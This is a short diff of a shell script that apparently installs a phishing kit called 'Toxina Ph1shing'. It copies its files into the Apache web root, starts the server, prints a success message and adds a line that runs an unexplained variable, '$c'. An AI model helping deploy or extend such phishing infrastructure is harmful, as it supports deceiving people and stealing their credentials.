@@ -92,6 +92,7 @@ cp -r * /var/www/html/page
 systemctl start apache2
 systemctl enable apache2.service
 echo "[**Toxina Ph1shing movido com sucesso!**]"
+$c
 
 sudo apt-get update -y && sudo apt-get full-upgrade -y
 sudo apt-get autoremove -y
